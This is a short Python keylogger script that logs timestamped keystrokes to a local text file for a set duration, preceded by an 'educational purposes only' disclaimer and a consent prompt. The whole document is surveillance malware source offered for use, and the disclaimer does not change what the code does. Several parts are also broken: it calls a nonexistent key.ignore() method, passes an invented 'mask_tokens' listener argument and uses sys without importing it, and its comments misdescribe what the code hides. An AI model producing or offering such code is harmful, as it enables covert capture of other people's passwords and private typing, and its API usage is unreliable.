import pynput
import time
import os
from getpass import getpass

# Defines the log file path
log_file_path = "keylogger_log.txt"

# Defines the keylogger function
def keylogger(key):
    # Consume the keyboard event to prevent it from being displayed on the screen
    key.ignore()

    # Format the timestamp and key press event
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    event = f"{timestamp} - {key}\n"

    # Writes the event to the log file
    with open(log_file_path, "a") as log_file:
        log_file.write(event)

# Displays the disclaimer and get user acceptance
print("---------------- Keylogger Disclaimer ----------------")
print("This keylogger program is intended for educational and ethical purposes only.")
print("Unauthorized use, distribution, or modification of this program is strictly prohibited.")
print("By using this program, you agree to the following terms and conditions:")
print("\n1. You will only use this program on devices and systems for which you have explicit permission.")
print("2. You will not use this program to violate any laws, regulations, or terms of service.")
print("3. You will not use this program to harm, disrupt, or exploit any devices or systems.")
print("4. You will not use this program to intercept, collect, or store any sensitive or confidential information.")
print("5. You will not redistribute or sell this program without the express permission of the author.")
print("6. The author is not responsible for any damages or losses incurred as a result of using this program.")
print("7. You will respect the privacy and security of all devices and systems you interact with using this program.")

accept_terms = input("\nDo you accept these terms and conditions? (y/n): ")

if accept_terms.lower() != 'y':
    print("You must accept the terms and conditions before using this program.")
    sys.exit()

# Prompts the user to enter the duration for which the keystrokes should be logged
log_duration = int(input("Enter the duration (in seconds) for which the keystrokes should be logged: "))

# Sets up the keylogger listener with the mask_tokens parameter to hide key presses from the screen
listener = pynput.keyboard.Listener(on_press=keylogger, mask_tokens=[pynput.keyboard.Key.cmd, pynput.keyboard.Key.ctrl])
listener.start()

# Runs the keylogger for the specified duration
start_time = time.time()
end_time = start_time + log_duration

while time.time() < end_time:
    time.sleep(1)

# Stops the keylogger listener
listener.stop()

# Displays the log file path
print("\nThe log file has been saved to:", os.path.abspath(log_file_path))
